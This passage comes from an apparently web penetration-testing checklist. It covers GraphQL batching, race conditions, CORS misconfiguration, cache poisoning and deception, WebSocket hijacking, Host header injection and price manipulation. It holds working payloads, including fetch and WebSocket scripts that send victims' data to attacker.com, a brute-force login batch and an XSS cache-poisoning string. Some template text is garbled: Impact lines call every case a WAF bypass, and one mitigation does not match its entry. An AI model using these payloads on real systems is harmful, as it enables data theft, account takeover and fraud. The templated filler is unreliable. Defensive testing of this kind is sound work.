**Tools:** Burp Suite, InQL

**References:** CWE-200; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger GraphQL Access Control, OWASP GraphQL

---

## FILTER-116 — GraphQL Batching Attack
**Test Category:** GraphQL · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF/Rate Limiting

**Where to Test / Injection Point:** GraphQL query/mutation — behind WAF/Rate Limiting

**How It Works:** Send multiple queries in single request to bypass rate limiting (brute force via batching)

**Detection Method:** Test if endpoint accepts array of queries

**Test Steps:** 1. Send array of queries: [{query: q1}{query: q2}...] 2. Send query with aliases for each attempt 3. Check if all queries execute in single request

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/Rate Limiting and reaches the sink — GraphQL control bypass (introspection/batching/BOLA, data exposure)

**Payload Example:**

```
POST [{"query":"mutation{login(u:\\"admin\\" p:\\"pass1\\"){token}}"},{"query":"mutation{login(u:\\"admin\\" p:\\"pass2\\"){token}}"},...] (100 attempts in 1 request)
```

**Why It Works:** Rate limiting counts HTTP requests not GraphQL operations; single request with 100 login attempts counts as 1 request

**Impact:** Filter/WAF bypass enabling GraphQL — GraphQL control bypass (introspection/batching/BOLA, data exposure)

**Mitigation:** Implement query-level rate limiting; limit batch size; rate limit by operation count not request count

**Tools:** Burp Suite, graphql-cop

**References:** CWE-200; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger GraphQL labs, HackerOne reports

---

## FILTER-117 — TOCTOU Race Condition
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side

**Where to Test / Injection Point:** concurrent state-changing endpoint — behind Server-Side

**How It Works:** Exploit time-of-check to time-of-use gap by sending concurrent requests

**Detection Method:** Send multiple requests simultaneously to state-changing endpoint

**Test Steps:** 1. Identify state-changing operation (coupon apply; vote; balance transfer) 2. Send 20+ simultaneous requests using Turbo Intruder 3. Check if operation applied multiple times

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side and reaches the sink — TOCTOU race (limit bypass / double-spend)

**Payload Example:**

```
Send 50 concurrent POST /apply-coupon requests; check if coupon applied multiple times for same user
```

**Why It Works:** Server checks if coupon is used before applying; but between check and apply another request can also pass the check

**Impact:** Filter/WAF bypass enabling Race Condition — TOCTOU race (limit bypass / double-spend)

**Mitigation:** Use database-level locking; atomic operations; idempotency keys; serialize critical operations

**Tools:** Burp Turbo Intruder, race-the-web, Burp Repeater (parallel send)

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); PortSwigger Race Condition labs, OWASP Race Conditions

---

## FILTER-118 — Limit Overrun via Race Condition
**Test Category:** Race Condition · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side

**Where to Test / Injection Point:** concurrent state-changing endpoint — behind Server-Side

**How It Works:** Bypass quantity limits (account balance; coupon; vote) by racing multiple requests

**Detection Method:** Send concurrent requests to reach-limited endpoint

**Test Steps:** 1. Account has $100 balance 2. Send 10 concurrent requests each transferring $100 3. Due to race condition multiple transfers succeed before balance updated 4. Overspend achieved

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side and reaches the sink — TOCTOU race (limit bypass / double-spend)

**Payload Example:**

```
Send 10 simultaneous POST /transfer {amount:100} requests via Turbo Intruder single-packet attack
```

**Why It Works:** Balance check and deduction are not atomic; multiple concurrent requests all read same balance before any deduction occurs

**Impact:** Filter/WAF bypass enabling Race Condition — TOCTOU race (limit bypass / double-spend)

**Mitigation:** Use pessimistic locking (SELECT FOR UPDATE); atomic operations; database transactions with proper isolation level

**Tools:** Burp Turbo Intruder (single-packet attack), custom script

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); PortSwigger Race Condition labs, James Kettle research

---

## FILTER-119 — CORS Wildcard/Reflected Origin
**Test Category:** CORS Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side

**Where to Test / Injection Point:** Origin/CORS response headers — behind Server-Side

**How It Works:** Server reflects any Origin header in Access-Control-Allow-Origin

**Detection Method:** Test by sending requests with different Origin headers

**Test Steps:** 1. Send request with Origin: https://attacker.com 2. Check if response contains Access-Control-Allow-Origin: https://attacker.com 3. Check for Access-Control-Allow-Credentials: true 4. If both: exploit

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side and reaches the sink — cross-origin read of authenticated data

**Payload Example:**

```
Origin: https://attacker.com → Response: Access-Control-Allow-Origin: https://attacker.com + Access-Control-Allow-Credentials: true
```

**Why It Works:** Server reflects any origin and allows credentials; attacker's site can read authenticated responses cross-origin

**Impact:** Filter/WAF bypass enabling CORS Misconfiguration — cross-origin read of authenticated data

**Mitigation:** Use specific origin allowlist; never reflect arbitrary origins with credentials; avoid wildcard with credentials

**Tools:** Burp Suite, curl

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS labs, OWASP CORS

---

## FILTER-120 — CORS Null Origin Trust
**Test Category:** CORS Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side

**Where to Test / Injection Point:** Origin/CORS response headers — behind Server-Side

**How It Works:** Server trusts Origin: null which can be triggered from sandboxed iframe

**Detection Method:** Check if Origin: null is accepted with credentials

**Test Steps:** 1. Send request with Origin: null 2. If ACAO: null + ACAC: true 3. Create sandboxed iframe on attacker site that sends request

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side and reaches the sink — cross-origin read of authenticated data

**Payload Example:**

```
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://target.com/api/data',{credentials:'include'}).then(r=>r.json()).then(d=>location='https://attacker.com/?leak='+JSON.stringify(d))</script>"></iframe>
```

**Why It Works:** sandbox attribute on iframes causes Origin: null; if server trusts null origin; cross-origin data theft is possible

**Impact:** Filter/WAF bypass enabling CORS Misconfiguration — cross-origin read of authenticated data

**Mitigation:** Never allow null origin with credentials; use specific origin allowlist

**Tools:** Burp Suite, HTML hosting

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS null origin lab

---

## FILTER-121 — CORS Subdomain Trust Exploitation
**Test Category:** CORS Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side

**Where to Test / Injection Point:** Origin/CORS response headers — behind Server-Side

**How It Works:** Server trusts all subdomains (*.target.com); exploit XSS on any subdomain

**Detection Method:** Find XSS on any subdomain of target then use it for CORS exploitation

**Test Steps:** 1. Check if ACAO allows subdomains: Origin: https://evil.target.com 2. If allowed find XSS on any target.com subdomain 3. Use XSS to make authenticated requests and exfiltrate data

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side and reaches the sink — cross-origin read of authenticated data

**Payload Example:**

```
From XSS on sub.target.com: fetch('https://api.target.com/sensitive',{credentials:'include'}).then(r=>r.text()).then(d=>location='https://attacker.com/?d='+d)
```

**Why It Works:** CORS trusts all subdomains; XSS on any subdomain (even abandoned/low-security one) becomes a same-origin exploit for the main domain

**Impact:** Filter/WAF bypass enabling CORS Misconfiguration — cross-origin read of authenticated data

**Mitigation:** Specify exact origins instead of wildcard subdomains; secure all subdomains equally

**Tools:** Burp Suite, subdomain enumeration tools

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS labs

---

## FILTER-122 — Cache Poisoning via Unkeyed Headers
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** CDN/Cache

**Where to Test / Injection Point:** unkeyed input / cache key — behind CDN/Cache

**How It Works:** Inject malicious content via headers not included in cache key

**Detection Method:** Identify unkeyed headers using Param Miner

**Test Steps:** 1. Use Param Miner to find unkeyed headers (X-Forwarded-Host; X-Original-URL etc.) 2. Inject malicious value in unkeyed header 3. Response is cached with malicious content 4. Other users receive poisoned response

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades CDN/Cache and reaches the sink — poisoned cache entry served to other users

**Payload Example:**

```
GET / HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-Host: attacker.com (if reflected in page and not in cache key)
```

**Why It Works:** CDN generates cache key from URL/Host/some headers; unkeyed headers influence response content but not cache key; poisoned response served to all users

**Impact:** Filter/WAF bypass enabling Web Cache Poisoning — poisoned cache entry served to other users

**Mitigation:** Include all response-influencing inputs in cache key; strip unnecessary headers; use Vary header properly

**Tools:** Param Miner (Burp), Web Cache Vulnerability Scanner

**References:** CWE-349; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); PortSwigger Web Cache Poisoning research, James Kettle

---

## FILTER-123 — Cache Poisoning via Unkeyed Query Parameters
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** CDN/Cache

**Where to Test / Injection Point:** unkeyed input / cache key — behind CDN/Cache

**How It Works:** Some CDN configurations exclude certain query parameters from cache key

**Detection Method:** Identify unkeyed query parameters that affect response

**Test Steps:** 1. Find parameters not in cache key: utm_* tracking params are often excluded 2. Inject XSS via unkeyed param that's reflected in page 3. Cached response with XSS served to all visitors

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades CDN/Cache and reaches the sink — poisoned cache entry served to other users

**Payload Example:**

```
GET /page?utm_content=<script>alert(1)</script> (utm_ params often excluded from cache key but reflected in analytics tags)
```

**Why It Works:** CDNs often exclude tracking parameters from cache key for efficiency; if these params are reflected in HTML the poisoned response is cached

**Impact:** Filter/WAF bypass enabling Web Cache Poisoning — poisoned cache entry served to other users

**Mitigation:** Include all reflected parameters in cache key; sanitize all reflected values regardless of caching

**Tools:** Param Miner, Burp Suite

**References:** CWE-349; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); PortSwigger Cache Poisoning labs, James Kettle research

---

## FILTER-124 — Web Cache Deception Attack
**Test Category:** Web Cache Deception · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** CDN/Cache

**Where to Test / Injection Point:** path/extension confusion — behind CDN/Cache

**How It Works:** Trick CDN into caching authenticated page by appending static file extension to URL

**Detection Method:** Test if adding .css/.js/.png to dynamic URL caches the response

**Test Steps:** 1. Login as victim 2. Access /account/settings.css (dynamic page with static extension) 3. CDN caches response thinking it's static 4. Attacker accesses same URL (gets victim's cached data)

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades CDN/Cache and reaches the sink — victim's private response cached and retrieved by attacker

**Payload Example:**

```
https://target.com/account/settings.css | https://target.com/myprofile/test.js | https://target.com/api/user/nonexistent.png
```

**Why It Works:** CDN determines cacheability by file extension; application ignores extra path info and serves dynamic page; CDN caches authenticated response

**Impact:** Filter/WAF bypass enabling Web Cache Deception — victim's private response cached and retrieved by attacker

**Mitigation:** Configure cache to respect Cache-Control headers from origin; don't cache based solely on extension; set no-cache on sensitive pages

**Tools:** Burp Suite, curl

**References:** CWE-525; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); Omer Gil Web Cache Deception research, PortSwigger

---

## FILTER-125 — WebSocket Cross-Site Hijacking (CSWSH)
**Test Category:** WebSocket · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side

**Where to Test / Injection Point:** WebSocket handshake (Origin) — behind Server-Side

**How It Works:** Cross-site WebSocket connection without origin validation; similar to CSRF for WebSockets

**Detection Method:** Check if WebSocket endpoint validates Origin header

**Test Steps:** 1. Check WebSocket handshake for Origin validation 2. Create attacker page that opens WebSocket to target 3. If cookies sent automatically (SameSite=None) then CSWSH possible 4. Read victim's WebSocket messages

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side and reaches the sink — cross-site WebSocket hijack / missing origin check

**Payload Example:**

```
<script>var ws=new WebSocket('wss://target.com/chat');ws.onmessage=function(e){fetch('https://attacker.com/log?data='+encodeURIComponent(e.data));};</script>
```

**Why It Works:** WebSocket connections send cookies automatically; if server doesn't validate Origin header; cross-site page can establish authenticated WebSocket

**Impact:** Filter/WAF bypass enabling WebSocket — cross-site WebSocket hijack / missing origin check

**Mitigation:** Validate Origin header in WebSocket handshake; use CSRF tokens in WebSocket connection; use SameSite cookies

**Tools:** Burp Suite (WebSocket), custom HTML

**References:** CWE-1385; -&gt;[WebSocket checklist](#/checklist/websocket); PortSwigger WebSocket labs, OWASP WebSocket Security

---

## FILTER-126 — Host Header Injection - Password Reset Poisoning
**Test Category:** Host Header Attack · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side

**Where to Test / Injection Point:** Host / X-Forwarded-Host header — behind Server-Side

**How It Works:** Inject attacker's domain in Host header to poison password reset link

**Detection Method:** Test if Host header value appears in password reset emails

**Test Steps:** 1. Request password reset for victim 2. Intercept request and change Host header to attacker.com 3. Victim receives reset email with link pointing to attacker.com 4. Victim clicks link; attacker captures reset token

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side and reaches the sink — Host-header abuse (password-reset poisoning, routing/cache abuse)

**Payload Example:**

```
POST /reset-password\r\nHost: attacker.com\r\n\r\nemail=victim@target.com (reset link becomes https://attacker.com/reset?token=SECRET)
```

**Why It Works:** Application uses Host header to construct URLs in emails; attacker-controlled Host injects attacker domain into reset link

**Impact:** Filter/WAF bypass enabling Host Header Attack — Host-header abuse (password-reset poisoning, routing/cache abuse)

**Mitigation:** Use server-configured hostname for URL generation; ignore/validate Host header; use absolute configured URLs

**Tools:** Burp Suite

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); PortSwigger Host Header labs, OWASP

---

## FILTER-127 — Host Header Injection - Access Internal Panels
**Test Category:** Host Header Attack · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF/Server-Side

**Where to Test / Injection Point:** Host / X-Forwarded-Host header — behind WAF/Server-Side

**How It Works:** Use Host header manipulation to access internal admin panels via virtual host routing

**Detection Method:** Test different Host header values for virtual host access

**Test Steps:** 1. Send request with Host: localhost 2. Try Host: 127.0.0.1 3. Try Host: admin.target.internal 4. Try X-Forwarded-Host: localhost 5. Check for admin panel access

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/Server-Side and reaches the sink — Host-header abuse (password-reset poisoning, routing/cache abuse)

**Payload Example:**

```
Host: localhost | Host: admin.target.local | X-Forwarded-Host: 127.0.0.1 | X-Host: localhost
```

**Why It Works:** Reverse proxy routes based on Host header; internal virtual hosts may respond to internal hostnames; WAF inspects original Host but proxy uses X-Forwarded-Host

**Impact:** Filter/WAF bypass enabling Host Header Attack — Host-header abuse (password-reset poisoning, routing/cache abuse)

**Mitigation:** Configure virtual hosts to only respond to expected hostnames; don't trust X-Forwarded-Host blindly

**Tools:** Burp Suite

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); PortSwigger Host Header labs

---

## FILTER-128 — Price Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Application-Level

**Where to Test / Injection Point:** business-flow parameters — behind Application-Level

**How It Works:** Modify price/amount values in requests to get products for less/free

**Detection Method:** Intercept and modify price parameters

**Test Steps:** 1. Add item to cart 2. Intercept checkout request 3. Modify price parameter to 0 or negative 4. Complete purchase

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Application-Level and reaches the sink — business-flow/authorization control is bypassed

**Payload Example:**

```
price=0.01 | amount=-100 | quantity=1&price=0 | discount=100
```

**Why It Works:** Application trusts client-sent price values; doesn't verify against server-side catalog

**Impact:** Filter/WAF bypass enabling Business Logic — business-flow/authorization control is bypassed

**Mitigation:** Calculate prices server-side from catalog; never trust client-sent financial values; verify totals server-side

**Tools:** Burp Suite

**References:** CWE-840; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Business Logic, WAHH Chapter 11

---

## FILTER-129 — Negative Quantity/Value
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Application-Level

**Where to Test / Injection Point:** business-flow parameters — behind Application-Level

**How It Works:** Submit negative quantities to get credits instead of charges

**Detection Method:** Try negative values in quantity and amount fields

**Test Steps:** 1. Add item with quantity: -1 2. Check if total becomes negative (credit) 3. Complete purchase 4. Check if account credited

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Application-Level and reaches the sink — business-flow/authorization control is bypassed

**Payload Example:**

```
quantity=-5&product=expensive_item | amount=-100 | count=-1
```

**Why It Works:** Application doesn't validate that quantities must be positive; negative value reverses the financial

**Impact:** Filter/WAF bypass enabling Business Logic — business-flow/authorization control is bypassed

**Mitigation:** Prefer allowlist validation + context-aware output encoding; do not rely on blacklist/WAF alone

**Tools:** Burp Suite, manual testing

**References:** CWE-840; -&gt;[IDOR / BOLA checklist](#/checklist/idor)

---
